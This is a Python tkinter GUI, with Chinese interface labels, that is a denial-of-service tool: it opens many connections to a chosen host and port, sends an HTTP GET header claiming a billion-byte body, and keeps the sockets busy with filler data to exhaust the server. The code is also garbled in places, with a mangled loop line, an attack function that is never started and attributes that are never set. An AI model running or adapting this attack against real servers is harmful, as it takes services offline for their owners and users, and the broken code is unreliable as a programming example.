import socket
import time
import threading
import tkinter as tk
from tkinter import messagebox, scrolledtext

class DDoSGUI:
    def __init__(self, root):
        self.root = root
        self.root.title("DDoS_GET_LINE")
        self.root.geometry("300x400")
        
        self.root.config(bg="#f0f0f0")
        self.font = ("Arial", 12)
        
        title_label = tk.Label(root, text="DDoS_GET_LINE", font=("Arial", 16, "bold"), bg="#f0f0f0")
        title_label.pack(pady=20)
        
        attack_frame = tk.Frame(root, bg="#f0f0f0")
        attack_frame.pack(pady=10)
        
        max_conn_label = tk.Label(attack_frame, text="攻击数量:", font=self.font, bg="#f0f0f0")
        max_conn_label.pack(side=tk.LEFT, padx=10)
        
        self.max_conn_entry = tk.Entry(attack_frame, font=self.font, width=10)
        self.max_conn_entry.pack(side=tk.LEFT)
        
        host_label = tk.Label(root, text="域名/IP:", font=self.font, bg="#f0f0f0")
        host_label.pack(pady=10)
        
        self.host_entry = tk.Entry(root, font=self.font)
        self.host_entry.pack()
        
        port_label = tk.Label(root, text="端口号(一般为80/443):", font=self.font, bg="#f0f0f0")
        port_label.pack(pady=10)
        
        self.port_entry = tk.Entry(root, font=self.font)
        self.port_entry.pack()
        
        button_frame = tk.Frame(root, bg="#f0f0f0")
        button_frame.pack(pady=20)
        
        self.start_button = tk.Button(button_frame, text="开始攻击", font=self.font, command=self.start_ddos)
        self.start_button.pack(side=tk.LEFT, padx=10)
        
        self.stop_button = tk.Button(button_frame, text="停止攻击", font=self.font, command=self.stop_ddos, state=tk.DISABLED)
        self.stop_button.pack(side=tk.LEFT)
        
        status_frame = tk.Frame(root, bg="#f0f0f0")
        status_frame.pack(pady=10)
        
        status_label = tk.Label(status_frame, text="状态:", font=self.font, bg="#f0f0f0")
        status_label.pack(side=tk.LEFT, padx=10)
        
        self.status_text = tk.StringVar()
        self.status_text.set("空闲")
        self.status_label = tk.Label(status_frame, textvariable=self.status_text, font=self.font, fg="green", bg="#f0f0f0")
        self.status_label.pack(side=tk.LEFT)
        
        output_frame = tk.Frame(root, bg="#f0f0f0")
        output_frame.pack(fill=tk.BOTH, expand=True, padx=20, pady=10)
        
        


    def start_ddos(self):
        try:
            max_conn = int(self.max_conn_entry.get())
            host = self.host_entry.get()
            port = int(self.port_entry.get())

            if not (1 <= port <= 65535):
                raise ValueError("Invalid port number")
            
            if not host:
                raise ValueError("Invalid host")
            
        except ValueError as e:
            messagebox.showerror("Error", str(e))
            return
        
        if self.attack_running:
            messagebox.showinfo("Info", "Attack is already running")
            return

        self.attack_running = True
        self.status_text.set("攻击中")
        self.start_button.config(state=tk.DISABLED)
        self.stop_button.config(state=tk.NORMAL)
        
        buf = ("GET /DVWA HTTP/1.1\r\n"
               "Host: %s\r\n"
               "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
               "Content-Length: 1000000000\r\n"
               "\r\n" % host)
        
        def send_attack():
            for _ in rangefor  in range(max_conn):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    s.connect((host, port))
                    s.send(bytes(buf, encoding='utf-8'))
                    self.sock_list.append(s)
                    self.output_text.insert(tk.END, f"[+] HTTP: 发送攻击请求成功，连接数: {len(self.sock_list)}\n")
                    self.output_text.see(tk.END)
                    time.sleep(0.1)
                except Exception as ex:
                    self.output_text.insert(tk.END, f"[-] HTTP: 连接服务器或发送请求出错: {ex}\n")
                    self.output_text.see(tk.END)
        
            while self.sock_list:
                for s in self.sock_list:
                    try:
                        s.send(bytes("ddos", encoding='utf-8'))
                        self.output_text.insert(tk.END, "[+] DDoS: 发送攻击成功!\n")
                        self.output_text.see(tk.END)
                    except Exception as ex:
                        self.output_text.insert(tk.END, f"[-] DDoS: 发送攻击出现异常: {ex}\n")
                        self.output_text.see(tk.END)
                        self.sock_list.remove(s)
                        s.close()
                time.sleep(1)
        
            self.status_text.set("空闲")
            self.start_button.config(state=tk.NORMAL)
            self.stop_button.config(state=tk.DISABLED)

    def stop_ddos(self):
        for s in self.sock_list:
            s.close()
        self.sock_list.clear()
        self.attack_running = False
        self.status_text.set("停止")
        self.start_button.config(state=tk.NORMAL)
        self.stop_button.config(state=tk.DISABLED)

if __name__ == "__main__":
    root = tk.Tk()
    app = DDoSGUI(root)
    root.mainloop()
